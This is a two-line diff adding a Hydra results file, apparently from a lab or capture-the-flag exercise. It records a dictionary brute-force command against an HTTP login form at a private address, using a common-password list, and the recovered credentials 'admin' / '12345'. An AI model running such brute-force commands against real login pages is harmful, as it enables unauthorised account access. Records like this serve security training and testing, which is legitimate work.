@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2023-12-03 15:23:33 on 10.10.66.156 http-post-form (hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt -V -o pass.txt 10.10.66.156 http-post-form /login:username=^USER^&password=^PASS^:login=password_incorrect)
+[80][http-post-form] host: 10.10.66.156   login: admin   password: 12345
